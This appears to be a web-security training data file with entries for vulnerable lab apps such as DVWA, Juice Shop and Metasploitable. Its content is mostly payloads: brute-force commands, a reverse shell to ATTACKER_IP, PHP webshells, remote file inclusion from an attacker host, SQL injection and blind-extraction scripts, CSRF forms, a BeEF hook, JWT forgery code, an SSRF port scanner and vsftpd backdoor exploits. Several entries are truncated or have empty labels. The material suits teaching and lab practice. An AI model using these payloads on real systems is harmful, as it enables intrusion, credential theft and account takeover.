dvwa-001.what: Password guessing attack using automated tools against a login form with no rate limiting or lockout policy.
dvwa-001.why: No rate limiting + predictable usernames = unlimited brute force. Credential stuffing also applies here.
detect: Response time differences between valid/invalid users
Burp Intruder with Sniper/Cluster Bomb mode
Error message patterns (username vs password errors reveal valid users)
Monitor for 401/403 floods in server logs
dvwa-001.docker_cmd:
docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa
# Visit http://localhost:4280 → Login: admin/password → Set Security: LOW → Go Brute Force

payloads.label: Hydra HTTP POST
payloads.code: hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 4280 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."

payloads.label: Python Brute Force
Burp Intruder Setup
payloads.code:
GET /vulnerabilities/brute/?username=admin&password=§PASSWORD§&Login=Login HTTP/1.1
Cookie: security=low; PHPSESSID=YOURTOKEN
# Set payload position on §PASSWORD§, use Sniper with wordlist

payloads.label: Medusa
payloads.code: medusa -h localhost -n 4280 -u admin -P rockyou.txt -M http -m DIR:/vulnerabilities/brute/

fixes: Rate limiting: max 10 login attempts per minute per IP
dvwa-001.bounty: $500–$5,000 | Common in: corporate login portals, admin panels | Report as: 'No brute-force protection on login endpoint'

dvwa-002.what: OS command injection lets an attacker execute arbitrary system commands by injecting metacharacters into vulnerable input fields.
dvwa-002.why: App passes user input directly to shell functions (system(), exec(), shell_exec()) without sanitization.
detect: Try ; id, && whoami, | uname -a as input
Time-based blind: ; sleep 5
Out-of-band: ; nslookup attacker.com
Burp Active Scanner
dvwa-002.docker_cmd:
docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa
# Visit → Security LOW → Command Injection module
# Input field: 127.0.0.1

payloads.label: Reverse Shell
payloads.code:
127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Listener on attacker:
nc -lvnp 4444

payloads.label: Filter Bypass (Medium Level)
payloads.code:
# DVWA medium blocks && and ;
# Use: | or newline
127.0.0.1|id
127.0.0.1%0aid

fixes: Never pass user input to shell functions
Run web server with minimum required OS privileges
Disable dangerous PHP functions: system, exec, shell_exec
dvwa-002.bounty: $2,000–$20,000 | Critical if server compromise | Report as: 'OS Command Injection in [feature]'

dvwa-003.what: Cross-Site Request Forgery tricks an authenticated user's browser into sending unintended state-changing requests to a trusted site.
dvwa-003.why: Server trusts cookies automatically sent by browser; lacks unpredictable token verification for state-changing requests.
detect: Find state-changing requests (password change, fund transfer)
Check if any anti-CSRF token exists
Test: remove Referer header, submit cross-origin
Burp: Generate CSRF PoC
dvwa-003.docker_cmd:
docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa
# Security LOW → CSRF module
# Observe the Change Password form — no token!

payloads.label: HTML Auto-Submit CSRF Form
payloads.code:
<html>
<body onload="document.forms[0].submit()">
  <form action="http://localhost:4280/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="hacked" />
    <input type="hidden" name="password_conf" value="hacked" />
    <input type="hidden" name="Change" value="Change" />
  </form>
</body>
</html>

payloads.label: IMG Tag CSRF (GET request)
Fetch CSRF
JSON CSRF Bypass
payloads.code:
<form method="POST" action="https://target.com/api/change-email" enctype="text/plain">
  <input name='{"email":"attacker@evil.com", "x":"' value='"}' />
</form>

fixes: Use SameSite=Strict or SameSite=Lax cookie attribute
dvwa-003.bounty: $500–$10,000 | High if admin action | Report as: 'CSRF on [critical function] allows account takeover'

dvwa-004.what: File Inclusion allows an attacker to include and execute arbitrary local (LFI) or remote (RFI) files through vulnerable include() calls.
dvwa-004.why: PHP include/require functions take user-controlled input without sanitization or path restriction.
detect: Look for ?page=, ?file=, ?include= parameters
Try: ?page=../../../../etc/passwd
PHP wrappers: php://filter/convert.base64-encode/resource=index.php
dvwa-004.docker_cmd:
docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa
# Security LOW → File Inclusion module

payloads.label: LFI - Read /etc/passwd
payloads.code:
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..%252f..%252f..%252fetc%252fpasswd

payloads.label: PHP Wrappers
payloads.code:
# Read source code base64 encoded:
?page=php://filter/convert.base64-encode/resource=../config.php

# Execute arbitrary PHP:
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

payloads.label: Log Poisoning → RCE
payloads.code:
# Step 1: Inject PHP into User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://localhost:4280/

# Step 2: Include access log
?page=../../../../var/log/apache2/access.log&cmd=id

payloads.label: RFI (Remote File Inclusion)
payloads.code:
echo '<?php system($_GET["c"]); ?>' > evil.php
python3 -m http.server 8888

# Include remotely:
?page=http://ATTACKER_IP:8888/evil.php&c=id

fixes: Never pass user input to include/require

dvwa-005.what: Unrestricted file upload allows attackers to upload malicious scripts (webshells) disguised as legitimate files, leading to RCE.
dvwa-005.why: Server trusts user-supplied filename/content-type without proper validation of actual file content.
detect: Upload a PHP file — if it executes, instant RCE
Change Content-Type to image/jpeg while keeping .php extension
Try double extensions: shell.php.jpg
dvwa-005.docker_cmd:
docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa
# Security LOW → File Upload module

payloads.label: Simple PHP Webshell
payloads.code:
# Create shell.php:
<?php system($_GET['cmd']); ?>

# Upload it, then access:
http://localhost:4280/hackable/uploads/shell.php?cmd=id

payloads.label: MIME Type Bypass
payloads.code:
# Intercept upload in Burp, change Content-Type:
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>

payloads.label: Extension Bypass
payloads.code:
shell.php5
shell.phtml
shell.pHp
shell.php.jpg
shell.php%00.jpg

payloads.label: GIF Header Bypass
payloads.code:
GIF89a <?php system($_GET['cmd']); ?>
# Save as: shell.gif — bypasses magic byte check!

fixes: Validate file type using MIME detection (fileinfo)
Rename files to random strings on server
Disable PHP execution in upload directory
dvwa-005.bounty: $3,000–$25,000 | Critical = instant RCE | Report as: 'Unrestricted file upload allows remote code execution'

dvwa-006.what: SQL injection allows manipulating database queries by injecting malicious SQL code through user input fields.
dvwa-006.why: Application builds SQL queries by string concatenation with unsanitized user input.
detect: Single quote ' causes error
Try: 1' OR '1'='1 for auth bypass
SQLmap: sqlmap -u 'URL?id=1' --dbs
dvwa-006.docker_cmd:
docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa
# Security LOW → SQL Injection module

payloads.label: UNION-based Data Extraction
payloads.code:
# Find column count:
1' ORDER BY 1--
1' ORDER BY 3-- (error = 2 columns)

# Extract data:
' UNION SELECT user(),database()--
' UNION SELECT user,password FROM users--

payloads.label: SQLmap Automated
payloads.code:
sqlmap -u 'http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low;PHPSESSID=XYZ' --dbs

sqlmap -u 'http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low;PHPSESSID=XYZ' -D dvwa -T users --dump

payloads.label: Authentication Bypass
payloads.code:
Username: admin'--
Username: ' OR 1=1--
Password: anything

fixes: Principle of least privilege for DB users
Error messages should not expose SQL/DB info
dvwa-006.bounty: $1,000–$20,000 | Critical if DB dump or auth bypass

dvwa-007.what: Blind SQL injection where no data is returned directly — attackers infer data through boolean or time differences.
dvwa-007.why: Application is vulnerable to SQLi but suppresses error messages and doesn't echo query results.
detect: 1' AND 1=1-- vs 1' AND 1=2-- → different responses (boolean)
1' AND SLEEP(5)-- → 5 second delay (time-based)
dvwa-007.docker_cmd:
docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa
# Security MEDIUM → SQL Injection (Blind)

payloads.label: Boolean-based Blind
payloads.code:
# Character extraction:
1' AND SUBSTRING(user(),1,1)='r'--
1' AND ASCII(SUBSTRING(user(),1,1))>100--

# Python automation:
import requests
cookies = {'security': 'medium', 'PHPSESSID': 'TOKEN'}
result = ''
for pos in range(1, 50):
    for char in range(32, 127):
        payload = f"1 AND ASCII(SUBSTRING(user(),{pos},1))={char}-- -"
        r = requests.get(f'http://localhost:4280/vulnerabilities/sqli_blind/?id={payload}&Submit=Submit', cookies=cookies)
        if 'User ID exists' in r.text:
            result += chr(char)
            break
print('User:', result)

payloads.label: Time-based Blind
payloads.code:
1' AND SLEEP(5)--

# Extract data:
1' AND IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)--

sqlmap -u 'URL' --technique=T --dbs

payloads.label: Out-of-Band SQLi
payloads.code:
# Requires MySQL FILE privilege:
1' AND LOAD_FILE(CONCAT(0x5c5c,user(),0x2e,database(),0x2eattacker,0x2ecom5c))--

fixes: Database user should NOT have FILE privilege

dvwa-008.what: Reflected XSS injects JavaScript through URL parameters that are reflected unsanitized in the server's HTML response.
dvwa-008.why: User input is directly included in page output without HTML encoding/escaping.
detect: Submit: <script>alert(1)</script> in all inputs
Try event handlers:
Check if < > ' " are encoded in HTML source

docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa

dvwa-009.what: Stored (Persistent) XSS saves malicious scripts to the database, executing them for ALL users who view the page.
dvwa-009.why: User-supplied data stored in DB is rendered back in HTML without sanitization — affects every visitor.
detect: Post comment with <script>alert(1)</script>
Check if it persists after reload
Look for rich text areas, profile fields, comments, chat

payloads.label: BeEF Hook

<script src='http://ATTACKER:3000/hook.js'></script>

payloads.label: Redirect All Users
payloads.code: <script>window.location='http://attacker.com/phishing'</script>

payloads.label: Bypass maxlength via Burp

message=<script>alert(document.cookie)</script>&txtName=test&btnSign=Sign+Guestbook

fixes: HTML-encode ALL user input before storing AND before rendering

dvwa-010.what: DOM-based XSS occurs entirely in client-side JavaScript — attacker data flows from DOM sources (URL, hash) to dangerous sinks (innerHTML, eval) without hitting the server.
dvwa-010.why: JavaScript reads from location.href/hash/document.URL and writes to innerHTML without sanitization.
detect: Check JS for: location.hash, location.search, document.URL
Find sinks: innerHTML, document.write, eval
DOM Invader (Burp Suite extension)

payloads.label: Query Parameter DOM XSS

payloads.label: JavaScript Protocol URI

javascript:alert(document.cookie)

dvwa-010.bounty: $500–$10,000 | DOM XSS often bypasses WAF | Report as: 'DOM XSS via [source] to [sink]'

juice-001.what: SQL injection in login endpoint allows bypassing authentication entirely to login as any user including admin.
juice-001.why: Login query built by string concatenation: SELECT * FROM Users WHERE email='INPUT' AND password='INPUT'
detect: Try email: ' OR 1=1-- in email field
Error message reveals SQL database type
Burp to intercept login POST and inject into JSON body

docker run --rm -d -p 3001:3000 --name juiceshop bkimminich/juice-shop
# Visit http://localhost:3001 → Go to Login page

payloads.label: SQLi Authentication Bypass

admin@juice-sh.op'--
' OR 1=1--

{"email":"' OR 1=1--","password":"anything"}

payloads.label: SQLi via REST API
payloads.code:
curl -X POST http://localhost:3001/api/Users/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"' OR 1=1--","password":"x"}'

payloads.label: SQLmap on JSON endpoint

sqlmap -u 'http://localhost:3001/rest/user/login' \

juice-004.what: Insecure Direct Object Reference (IDOR) — accessing another user's resources by manipulating object identifiers in API calls.
juice-004.why: Server authorizes based on authentication (logged in?) but not authorization (is this YOUR resource?).
detect: Find numeric IDs in API paths: /api/baskets/1
Change your ID to another user's ID
Burp Intruder: enumerate IDs
juice-004.docker_cmd:
docker run --rm -d -p 3001:3000 --name juiceshop bkimminich/juice-shop
# Login → Add items to basket → Capture API call

payloads.label: IDOR Basket Access
payloads.code:
# Your basket, change to another user's:
curl -H 'Authorization: Bearer YOUR_TOKEN' \
  http://localhost:3001/rest/basket/1
  
# Try incrementing IDs: 1,2,3,4,5...

payloads.label: Python IDOR Scanner
payloads.code:
import requests
token = 'YOUR_JWT_TOKEN'
for basket_id in range(1, 100):
    r = requests.get(f'http://localhost:3001/rest/basket/{basket_id}', 
                     headers={'Authorization': f'Bearer {token}'})
    if r.status_code == 200 and r.json().get('data'):
        print(f'[+] Found basket {basket_id}: {r.json()}')

fixes: Authorization check: verify resource.userId == current user's ID
Use UUIDs instead of sequential integers
juice-004.bounty: $500–$10,000 | PII exposure = High | Report as: 'IDOR in [endpoint] exposes other users data'

juice-007.what: JWT (JSON Web Token) manipulation exploits weak algorithm acceptance or improper signature verification to forge tokens.
juice-007.why: Server accepts alg:none (no signature needed) or accepts HS256 with RSA public key as secret.
detect: Decode JWT at jwt.io — check alg header
Try alg:none attack
Check if server exposes public key at /jwks.json
juice-007.docker_cmd:
docker run --rm -d -p 3001:3000 --name juiceshop bkimminich/juice-shop
# Login normally → capture JWT token in response

payloads.label: Algorithm None Attack
payloads.code:
import base64, json

token = 'YOUR_TOKEN'
parts = token.split('.')

new_header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
new_payload = base64.b64encode(json.dumps({"id":1,"email":"admin@juice-sh.op","role":"admin"}).encode()).decode().rstrip('=')
forged = f"{new_header}.{new_payload}."
print(forged)

payloads.label: JWT Tool
payloads.code:
# pip install jwt_tool
python3 jwt_tool.py YOUR_TOKEN -X a  # alg:none
python3 jwt_tool.py YOUR_TOKEN -T -I -pc role -pv admin

payloads.label: HS256 Key Confusion
payloads.code:
import jwt
public_key = open('pubkey.pem').read()
forged = jwt.encode({'id': 1, 'role': 'admin'}, public_key, algorithm='HS256')

fixes: Set JWT expiry to short windows

bwapp-007.what: XML External Entity (XXE) injection exploits XML parsers that process external entity references, enabling file reads, SSRF, and DoS.
bwapp-007.why: XML parser has external entity processing enabled (default ON) and processes DTD from user-supplied XML.
detect: Find XML inputs: SOAP, REST with XML, SVG/DOCX upload
Submit DOCTYPE with SYSTEM entity
Use Burp Collaborator for blind XXE

ps-004.what: Server-Side Request Forgery (SSRF) tricks the server into making HTTP requests to internal/external resources on behalf of the attacker.
ps-004.why: Application fetches user-supplied URLs without validation — attacker can reach cloud metadata, internal APIs.

Try: http://localhost, http://127.0.0.1, http://169.254.169.254

http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:9200

import requests, time
for port in [22,80,443,3306,6379,8080,9200,27017]:
    start = time.time()
    r = requests.get(f'http://TARGET.com/fetch?url=http://127.0.0.1:{port}')
    if time.time()-start > 1 or 'error' not in r.text.lower():
        print(f'[OPEN] {port}')

meta-001.what: The vsftpd 2.3.4 package contains a backdoor — root shell opens on port 6200 when ':)' is appended to the FTP username.
meta-001.why: Malicious code was inserted into vsftpd source code — classic supply chain attack.
detect: Nmap: nmap -sV TARGET — shows vsftpd 2.3.4
Metasploit: search vsftpd
Manual: telnet TARGET 21 → send user smiley → check port 6200

payloads.label: Metasploit Exploit
payloads.code:
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET_IP
run
# → root shell!

payloads.label: Manual Exploitation
payloads.code:
# Trigger backdoor via FTP:
nc TARGET_IP 21
USER backdoored:)
PASS anything

# Connect backdoor shell:
nc TARGET_IP 6200
id  # uid=0(root)

payloads.label: Python Exploit
payloads.code:
import socket, time
ip = 'TARGET_IP'
s = socket.socket()
s.connect((ip, 21))
s.recv(1024)
s.send(b'USER hackme:)\r\n')
time.sleep(1)
s.send(b'PASS x\r\n')
time.sleep(1)
s.close()

shell = socket.socket()
shell.connect((ip, 6200))
shell.send(b'id\n')
print(shell.recv(1024).decode())

ps-015.what: JWT attacks exploit weak algorithm choices, key confusion, header injection (jku/kid) to forge arbitrary tokens.
ps-015.why: Libraries accepting multiple algorithms, improper key validation, or trusting user-controlled JWK/JKU parameters.
detect: Decode JWT at jwt.io — analyze header claims
Check jku/x5u headers
Try kid: '../../../dev/null'
Test alg:none
ps-015.docker_cmd:
# PortSwigger JWT labs:
# https://portswigger.net/web-security/jwt
# WebGoat JWT module:
docker run --rm -d -p 8082:8080 webgoat/webgoat

payloads.label: jku Header Injection
kid Path Traversal
payloads.code:
# If kid used as file path:
{"alg": "HS256", "kid": "../../../../dev/null"}
# /dev/null = empty = sign with empty string
import jwt
forged = jwt.encode({'admin': True}, '', algorithm='HS256', headers={'kid': '../../../../dev/null'})

payloads.label: Embedded JWK Attack

fixes: Ignore jku/x5u or strictly whitelist allowed key servers
Validate kid against static list, never use as file path
